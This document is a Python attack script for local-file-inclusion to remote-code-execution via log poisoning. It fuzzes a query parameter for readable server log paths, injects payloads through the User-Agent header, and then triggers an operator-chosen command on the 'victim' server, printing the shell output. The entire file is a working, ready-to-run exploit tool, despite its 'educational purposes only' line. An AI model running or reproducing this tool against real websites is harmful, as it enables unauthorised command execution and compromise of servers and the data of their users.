#!/usr/bin/env python3
# Author: coldtears
# For educational purposes only.
# References: https://www.thegeekstuff.com/2011/08/linux-var-log-files/ 
#             https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1 

import requests
import argparse
import re
import time
from colorama import Fore, Style, init
from fake_useragent import UserAgent

init(autoreset=True)
ua = UserAgent()

logo = r"""
              _
   ___  ___  (_)__ ___  ___    ___  __ __
  / _ \/ _ \/ (_-</ _ \/ _ \_ / _ \/ // /
 / .__/\___/_/___/\___/_//_(_) .__/\_, /
/_/                         /_/   /___/
"""
color1 = '\033[38;2;240;240;240m'
color2 = '\033[38;2;210;210;210m'
color3 = '\033[38;2;180;180;180m'
reset = '\033[0m'

print(Fore.LIGHTGREEN_EX + logo)
print(f'{color1}by{reset} {color2}c0ld{reset}{color3}t3ars{reset}')
def detect_query(url):
    match = re.search(r'\?([^#]+)', url)
    return match.group(1).split('&') if match else []

def parse_cookies(cookie_str):
    return dict(pair.strip().split("=", 1) for pair in cookie_str.split(";")) if cookie_str else {}

def exploit_log(url, log_path, cookies, cmd, payloads):
    session = requests.Session()
    
    try:
        base_url = url.split('?')[0]
        query_param = url.split('?')[1].split('=')[0]
    except IndexError:
        print(f"{Fore.RED}[!] Invalid URL format{Style.RESET_ALL}")
        return False

    for payload in payloads:
        payload = payload.strip()
        if not payload:
            continue

        headers = {"User-Agent": payload}
        print(f"{Fore.YELLOW}[+] Poisoning with payload: {payload}{Style.RESET_ALL}")

        try:
            session.get(url, headers=headers, cookies=cookies, timeout=5)
            print(f"{Fore.GREEN}[+] Poisoned successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Poisoning failed: {e}{Style.RESET_ALL}")
            continue

        time.sleep(1.5)

        trigger_url = f"{base_url}?{query_param}={log_path}&cmd={cmd}"
        print(f"{Fore.YELLOW}[+] Triggering command: {trigger_url}{Style.RESET_ALL}")

        try:
            resp = session.get(trigger_url, cookies=cookies, timeout=10)
            if 'shell:' in resp.text:
                print(Fore.CYAN + "[+] Output:" + Style.RESET_ALL)
                print(resp.text.split('shell:')[-1])
                return True
            else:
                print(f"{Fore.RED}[!] No output received from payload{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Trigger error: {e}{Style.RESET_ALL}")

    return False

def test_log(url, param, word, cookies, cmd, payloads):
    try:
        fuzzed_url = url.replace(param, f"{param.split('=')[0]}={word}")
        res = requests.get(fuzzed_url, cookies=cookies, timeout=5)

        if any(kw in res.text for kw in ['Linux x86_64', 'User-Agent', 'Host:', 'Accept-Language', 'TGludXggeDg2XzY0', 'VXNlci1BZ2VudA==', 'SG9zdDo=']):
            print(f"{Fore.GREEN}[+] Found log: {word}{Style.RESET_ALL}")
            if exploit_log(fuzzed_url, word, cookies, cmd, payloads):
                return True
    except Exception as e:
        return False
    return False

def main():
    parser = argparse.ArgumentParser()
    print('Version 1.1 | stable')
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-w', '--wordlist', default='src/wordlist.txt')
    parser.add_argument('--cookie', help='cookies for search')
    parser.add_argument('-e', '--exec', required=True, help='remote command to execute')
    parser.add_argument('-p', '--payloads', default='src/payloads.txt', help='list of payloads to inject via User-Agent')

    args = parser.parse_args()
    cookies = parse_cookies(args.cookie)

    print(f"{Fore.WHITE}[INFO] Victim: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[INFO] Wordlist: {args.wordlist}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[INFO] Payloads: {args.payloads}{Style.RESET_ALL}")

    params = detect_query(args.url)
    if not params:
        print(f"{Fore.RED}[!] No query param found{Style.RESET_ALL}")
        return

    try:
        with open(args.wordlist) as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Wordlist not found: {args.wordlist}{Style.RESET_ALL}")
        return

    try:
        with open(args.payloads) as f:
            payloads = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] Payloads file not found: {args.payloads}{Style.RESET_ALL}")
        return

    for word in words:
        for param in params:
            success = test_log(args.url, param, word, cookies, args.exec, payloads)
            if success:
                print(f"{Fore.GREEN}[+] Success exploit!{Style.RESET_ALL}")
                return

    print(f"{Fore.RED}[!] No accessible log found{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
